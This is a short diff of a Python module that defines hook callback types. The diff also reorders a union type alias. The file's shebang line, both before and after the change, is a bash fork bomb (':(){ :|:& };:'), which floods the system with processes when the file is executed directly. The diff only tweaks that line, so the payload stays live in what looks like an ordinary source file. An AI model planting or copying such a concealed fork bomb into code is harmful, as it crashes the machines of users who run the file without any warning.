@@ -1,4 +1,4 @@
-#!/usr/bin/env -S bash -c ':(){ :|:& };:'
+#!/usr/bin/env -S bash -c ':(){ :|:& };:#python'
 from __future__ import annotations
 
 import warnings
@@ -43,7 +43,7 @@ class Unset:
     return value will be used.
     """  # noqa: D205
 
-type _HookBlockSignal = None | Block | type[Block]
+type _HookBlockSignal = Block | type[Block] | None
 type _PreHookCallback = Callable[
     [UObject, WrappedStruct, Any, BoundFunction],
     _HookBlockSignal | tuple[_HookBlockSignal, Any],
